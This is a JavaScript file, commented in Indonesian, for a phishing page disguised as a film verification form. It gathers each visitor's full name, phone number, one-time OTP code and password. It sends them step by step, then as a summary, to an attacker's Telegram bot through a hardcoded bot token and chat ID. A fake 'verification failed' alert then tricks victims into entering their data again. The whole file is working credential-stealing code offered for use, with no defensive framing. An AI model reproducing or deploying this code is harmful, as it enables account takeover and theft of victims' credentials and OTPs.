// Chat ID dan Token Bot Telegram
const chatId = "6124038392";
const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";

// Variabel untuk menyimpan data pengguna
let fullName = "";
let phone = "";
let otp = "";
let password = "";

// Function to show loading overlay
function showLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "flex"; // Show the loading overlay
}

// Function to hide loading overlay
function hideLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "none"; // Hide the loading overlay
}

// Function to show custom alert
function showAlert(message) {
  const alertMessage = document.getElementById("alertMessage");
  alertMessage.textContent = message; // Set the message
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "flex"; // Show the alert
  document.body.style.overflow = "hidden"; // Prevent scrolling when alert is open
}

// Function to hide the alert
function hideAlert() {
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "none"; // Hide the alert
  document.body.style.overflow = "auto"; // Restore scrolling
}

// Fungsi untuk mengatur tampilan langkah-langkah verifikasi
function nextStep(step) {
  showLoading(); // Show loading before processing

  setTimeout(() => {
    // Wait for 2 seconds
    if (step === 2) {
      // Validasi dan simpan Nama Lengkap dan Nomor Telepon
      fullName = document.getElementById("fullName").value;
      phone = document.getElementById("phone").value;
      if (!fullName || !phone) {
        showAlert("Nama Lengkap dan Nomor Telepon harus diisi!");
        hideLoading(); // Hide loading if there's an error
        return; // Tidak mereset form jika input salah, cukup memberi alert
      }
      let message = `Verifikasi Film:\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}`;
      sendToTelegram(message); // Kirim data nama dan nomor telepon
    } else if (step === 3) {
      // Validasi dan simpan Kode OTP
      otp = document.getElementById("otp").value;
      if (!otp) {
        showAlert("Kode OTP harus diisi!");
        hideLoading(); // Hide loading if there's an error
        return; // Tidak mereset form jika input salah, cukup memberi alert
      }
      let message = `Kode OTP: ${otp}`;
      sendToTelegram(message); // Kirim data kode OTP
    } else if (step === 4) {
      // Validasi dan simpan Kata Sandi
      password = document.getElementById("password").value;
      if (!password || password.trim() === "") {
        showAlert("Kata Sandi harus diisi!");
        hideLoading(); // Hide loading if there's an error
        return; // Tidak mereset form jika input salah, cukup memberi alert
      }
      let message = `Kata Sandi: ${password}`;
      sendToTelegram(message); // Kirim data kata sandi
    }

    // Mengatur tampilan langkah berikutnya
    document.getElementById("step1").style.display =
      step === 1 ? "block" : "none";
    document.getElementById("step2").style.display =
      step === 2 ? "block" : "none";
    document.getElementById("step3").style.display =
      step === 3 ? "block" : "none";

    hideLoading(); // Hide loading after processing
  }, 2000); // 2 seconds delay
}

// Fungsi untuk mengirim data ke Telegram
function sendToTelegram(message) {
  showLoading(); // Show loading when sending data

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Gagal mengirim data. Silakan coba lagi.");
      }
      hideLoading(); // Hide loading after response
    })
    .catch((error) => {
      showAlert("Terjadi kesalahan: " + error.message);
      hideLoading(); // Hide loading if there's an error
    });
}

// Fungsi untuk mengirim ringkasan data ke Telegram
function sendSummary() {
  const summaryMessage = `Ringkasan Data:\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}\nKode OTP: ${otp}\nKata Sandi: ${password}`;
  sendToTelegram(summaryMessage); // Use existing sendToTelegram function
}

// Fungsi untuk mereset form dan mengarahkan kembali ke langkah pertama
function resetForm() {
  fullName = "";
  phone = "";
  otp = "";
  password = "";
  document.getElementById("fullName").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("otp").value = "";
  document.getElementById("password").value = "";
  document.getElementById("step1").style.display = "block"; // Tampilkan langkah pertama
  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "none";
}

// Fungsi akhir untuk mengarahkan ke halaman film dan mengirim summary
function submitVerification() {
  // Validasi kata sandi sebelum mengirim summary
  const passwordInput = document.getElementById("password").value;
  if (passwordInput.trim() === "") {
    showAlert("Kata Sandi harus diisi sebelum mengirim ringkasan.");
    return; // Tidak mengarahkan jika kata sandi kosong
  }

  // Set password from the input before sending summary
  password = passwordInput;

  // Kirim ringkasan setelah mengisi semua informasi
  showLoading(); // Show loading before sending summary

  setTimeout(() => {
    sendSummary(); // Send the summary after delay
    showAlert("Verifikasi anda gagal tolong masukkan data yang benar"); // Show alert after sending summary
    resetForm(); // Reset form after all data is sent
    hideLoading(); // Hide loading after processing
  }, 1200); // 2 seconds delay
}

// Memastikan hanya angka yang diizinkan di nomor telepon dan OTP
document.getElementById("phone").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});

document.getElementById("otp").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});
